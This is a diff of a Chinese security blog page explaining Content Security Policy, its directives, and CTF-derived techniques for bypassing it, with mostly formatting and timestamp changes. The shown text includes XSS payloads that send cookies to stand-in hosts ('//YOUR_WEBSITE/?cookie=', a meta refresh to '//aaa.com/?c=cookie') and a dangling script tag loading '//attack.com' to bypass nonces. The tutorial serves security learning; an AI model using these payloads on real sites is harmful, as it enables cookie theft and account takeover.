@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413163320.png">
 <meta property="article:published_time" content="2020-03-23T12:17:36.000Z">
-<meta property="article:modified_time" content="2020-04-18T10:00:47.704Z">
+<meta property="article:modified_time" content="2020-04-19T07:06:13.598Z">
 <meta property="article:author" content="baishuo">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413163320.png">
@@ -197,7 +197,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-04-18 18:00:47" itemprop="dateModified" datetime="2020-04-18T18:00:47+08:00">2020-04-18</time>
+                <time title="修改时间：2020-04-19 15:06:13" itemprop="dateModified" datetime="2020-04-19T15:06:13+08:00">2020-04-19</time>
               </span>
 
           
@@ -216,12 +216,14 @@
 <h2 id="0x01-CSP"><a href="#0x01-CSP" class="headerlink" title="0x01 CSP"></a>0x01 CSP</h2><p>CSP：内容安全策略，通俗的说用于检测并削弱特定类型的攻击，包括XSS、数据注入等攻击。CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p>
 <p>CSP中常见的header字段为Content-Security-Policy。</p>
 <p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200413163320.png" alt=""></p>
-<h5 id="1、CSP部署位置"><a href="#1、CSP部署位置" class="headerlink" title="1、CSP部署位置"></a>1、CSP部署位置</h5><p>· HTTP头部名为Content-Security-Policy的字段</p>
-<p>· Meta头：&lt; meta http-equiv=”Content-Security-Policy” content=”script-src ‘self’; script-src<br>‘self’;”&gt;</p>
-<p>· 同时有多条CSP，则多条同时生效，不会覆盖</p>
+<h5 id="1、CSP部署位置"><a href="#1、CSP部署位置" class="headerlink" title="1、CSP部署位置"></a>1、CSP部署位置</h5><p>​    · HTTP头部名为Content-Security-Policy的字段</p>
+<p>​    · Meta头：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; script-src</span></span></span><br><span class="line"><span class="tag"><span class="string">'self';"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    · 同时有多条CSP，则多条同时生效，不会覆盖</p>
 <p><strong>2、CSP测试网站</strong></p>
-<p><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></p>
-<p>RCTF 2018 rBblo 非预期</p>
+<p>​    <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></p>
+<p>​    RCTF 2018 rBblo 非预期</p>
 <p><strong>3、CSP介绍</strong></p>
 <ol>
 <li><p>一组CSP策略由多组指令构成，中间以分号间隔</p>
@@ -236,20 +238,20 @@
 </li>
 </ol>
 <p><strong>4、CSP - 常见资源指令</strong></p>
-<p>• <strong>default-src</strong> 是以下所有资源指令的默认值</p>
-<p>• <strong>child-src</strong> ：限制iframe等标签可以使用的地址</p>
-<p>• <strong>connect-src</strong> ：限制Ajax、WebSocket等的可连接地址</p>
-<p>• <strong>font-src</strong> ：限制网页字体（WebFont）的来源</p>
-<p>• <strong>img-src</strong> ：限制图像的来源</p>
-<p>• <strong>media-src</strong> ：限制视频和音频的来源</p>
-<p>• <strong>object-src</strong> ：限制Flash等插件的来源</p>
-<p>• <strong>script-src</strong> ：限制页面可执行的JavaScript的来源</p>
-<p>• <strong>style-src</strong> ：限制CSS来源</p>
-<p>• <strong>sandbox</strong> 类似iframe沙盒</p>
-<p>• <strong>base-uri</strong> 限制&lt; base&gt;标签可以使用的地址：</p>
-<p>​    · &lt; base&gt; 元素指定当前页面所有相对 URL 的根 URL。</p>
-<p>• <strong>form-action</strong> ：限制form表单可以被提交到哪里</p>
-<p>• <strong>upgrade-insecure-requests</strong> ：自动升级http到https</p>
+<p>​    • <strong>default-src</strong> 是以下所有资源指令的默认值</p>
+<p>​    • <strong>child-src</strong> ：限制iframe等标签可以使用的地址</p>
+<p>​    • <strong>connect-src</strong> ：限制Ajax、WebSocket等的可连接地址</p>
+<p>​    • <strong>font-src</strong> ：限制网页字体（WebFont）的来源</p>
+<p>​    • <strong>img-src</strong> ：限制图像的来源</p>
+<p>​    • <strong>media-src</strong> ：限制视频和音频的来源</p>
+<p>​    • <strong>object-src</strong> ：限制Flash等插件的来源</p>
+<p>​    • <strong>script-src</strong> ：限制页面可执行的JavaScript的来源</p>
+<p>​    • <strong>style-src</strong> ：限制CSS来源</p>
+<p>​    • <strong>sandbox</strong> 类似iframe沙盒</p>
+<p>​    • <strong>base-uri</strong> 限制&lt; base&gt;标签可以使用的地址：</p>
+<p>​        · &lt; base&gt; 元素指定当前页面所有相对 URL 的根 URL。</p>
+<p>​    • <strong>form-action</strong> ：限制form表单可以被提交到哪里</p>
+<p>​    • <strong>upgrade-insecure-requests</strong> ：自动升级http到https</p>
 <p><strong>5、CSP - 内容源</strong></p>
 <ol>
 <li>来源列表： <em>://</em>.example.com:*、    <a href="http://www.baidu.com/" target="_blank" rel="noopener">http://www.baidu.com/</a></li>
@@ -272,7 +274,7 @@
 <li><p><img src=//YOUR_WEBSITE/?cookie=cookie></p>
 </li>
 <li><p>没有任何手段可以限制跳转</p>
-<p>< meta http-equiv="refresh" content="1;url=//aaa.com/?c=cookie"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=//aaa.com/?c=cookie"</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>ServiceWorker</p>
 </li>
@@ -296,7 +298,7 @@
 <p>​    <a href="https://blog.cal1.cn/post/0CTF%202018%20Quals%20Bl0g%20writeup" target="_blank" rel="noopener">https://blog.cal1.cn/post/0CTF%202018%20Quals%20Bl0g%20writeup</a></p>
 <p><strong>0x04、script-src 'nonce-xxxx‘</strong></p>
 <p>​    1、破坏页面结构：< p>< ?php echo $a;?>< /p> < script nonce="abc">alert(1)</ script></p>
-<p>​    2、插入：<script src=//attack.com a="</p>
+<p>​    2、插入： <code>&lt;script src=//attack.com a=&quot;</code></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>、结果：</span><br><span class="line">&lt;p&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span> <span class="xml"><span class="tag"><span class="string">&lt;script"</span></span></span></span><br><span class="line"><span class="xml">nonce="abc"&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 
@@ -425,7 +427,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#苦恼"><span class="nav-number">1.</span> <span class="nav-text">苦恼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CSP"><span class="nav-number">2.</span> <span class="nav-text">0x01 CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、CSP部署位置"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">1、CSP部署位置</span></a></li></ol></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#苦恼"><span class="nav-number">1.</span> <span class="nav-text">苦恼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CSP"><span class="nav-number">2.</span> <span class="nav-text">0x01 CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、CSP部署位置"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">1、CSP部署位置</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-CSP绕过"><span class="nav-number">3.</span> <span class="nav-text">0x02 CSP绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、location绕过"><span class="nav-number">3.0.1.</span> <span class="nav-text">1、location绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、iframe绕过"><span class="nav-number">3.0.2.</span> <span class="nav-text">2、iframe绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、cdn绕过"><span class="nav-number">3.0.3.</span> <span class="nav-text">3、cdn绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#低版本angular-js：https-github-com-google-csp-evaluator-blob-master-whitelist-bypasses-angular-js-L26-L76"><span class="nav-number">3.0.3.1.</span> <span class="nav-text">低版本angular js：https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;csp-evaluator&#x2F;blob&#x2F;master&#x2F;whitelist_bypasses&#x2F;angular.js#L26-L76</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#库绕过-https-www-jianshu-com-p-f1de775bc43e"><span class="nav-number">3.0.3.2.</span> <span class="nav-text">库绕过:https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;f1de775bc43e</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、站点可控静态资源绕过"><span class="nav-number">3.0.4.</span> <span class="nav-text">4、站点可控静态资源绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、Base-uri绕过"><span class="nav-number">3.0.5.</span> <span class="nav-text">5、Base-uri绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6、不完整script标签绕过nonce"><span class="nav-number">3.0.6.</span> <span class="nav-text">6、不完整script标签绕过nonce</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -441,7 +443,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
